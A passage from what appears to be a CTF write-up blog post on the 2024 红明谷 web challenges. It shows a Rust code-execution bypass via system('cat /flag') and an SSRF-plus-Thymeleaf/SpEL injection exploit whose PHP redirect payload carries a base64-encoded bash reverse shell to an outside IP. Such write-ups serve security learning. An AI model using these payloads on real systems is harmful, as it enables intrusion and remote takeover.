+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="kt">char</span>::<span class="n">from</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span>::<span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="k">mut</span><span class="w"> </span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span>::<span class="n">create</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">.rs&#34;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">file</span><span class="p">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">build_output</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Command</span>::<span class="n">new</span><span class="p">(</span><span class="s">&#34;rustc&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">.rs&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">))</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;-C&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;debuginfo=0&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;-C&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;opt-level=3&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;-o&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">))</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">output</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">build_output</span><span class="p">.</span><span class="n">status</span><span class="p">.</span><span class="n">success</span><span class="p">(){</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fs</span>::<span class="n">remove_file</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">.rs&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="n">build_output</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">as_slice</span><span class="p">()).</span><span class="n">to_string</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">fs</span>::<span class="n">remove_file</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">.rs&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Command</span>::<span class="n">new</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">))</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">output</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">output</span><span class="p">.</span><span class="n">status</span><span class="p">.</span><span class="n">success</span><span class="p">(){</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fs</span>::<span class="n">remove_file</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">as_slice</span><span class="p">()).</span><span class="n">to_string</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fs</span>::<span class="n">remove_file</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&#34;playground/</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">file_name</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">as_slice</span><span class="p">()).</span><span class="n">to_string</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">String</span>::<span class="n">default</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[launch]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">rocket</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nc">_</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">figment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rocket</span>::<span class="n">Config</span>::<span class="n">figment</span><span class="p">()</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">merge</span><span class="p">((</span><span class="s">&#34;address&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rocket</span>::<span class="n">custom</span><span class="p">(</span><span class="n">figment</span><span class="p">).</span><span class="n">mount</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="w"> </span><span class="fm">routes!</span><span class="p">[</span><span class="n">index</span><span class="p">,</span><span class="n">run_rust_code</span><span class="p">])</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>限制了<code>std</code>，利用内联写C进行绕过</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">extern</span> <span class="s">&#34;C&#34;</span> <span class="p">{</span><span class="n">fn</span> <span class="nf">system</span><span class="p">(</span><span class="nl">s</span><span class="p">:</span> <span class="o">*</span><span class="k">const</span> <span class="n">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">i32</span><span class="p">;}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">		<span class="n">unsafe</span><span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="n">b</span><span class="s">&#34;cat /flag&#34;</span> <span class="n">as</span> <span class="o">*</span><span class="k">const</span> <span class="n">u8</span><span class="p">)};</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="simp1escape" class="heading-element">
+  <a href="#simp1escape" class="heading-mark"></a>Simp1escape</h2><p>CurlController下存在SSRF漏洞，但是限制了不能是本地IP，利用302跳转绕过<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+结合<code>AdminController</code>存在<code>Thymelaef</code>模版注入(只允许本地访问)<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+打一发模版注入漏洞<br>
+<a href="https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89"target="_blank" rel="external nofollow noopener noreferrer">https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89</a><br>
+<code>exp.php</code></p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location:http://127.0.0.1:8080/getsites?hostname=%5B%5B%24%7BT(java.lang.Boolean).forName(%22com.fasterxml.jackson.databind.ObjectMapper%22).newInstance().readValue(%22%7B%7D%22%2CT(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(%22T(Runtime).getRuntime().exec(&#39;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIwLjIxNS44LzEyMzQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&#39;)%22).getValue()%7D%5D%5D&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/curl?url=http://ip:80/exp.php</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-04-03 18:26:39">Updated on 2024-04-03&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/" data-title="红明谷-2024-Web"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web/" class="post-tag" title="Tags - 红明谷CTF Web">红明谷CTF Web</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/" class="post-nav-item" rel="prev" title="CTF-BabyCodeIgniter-Web出题记(1)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CTF-BabyCodeIgniter-Web出题记(1)</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
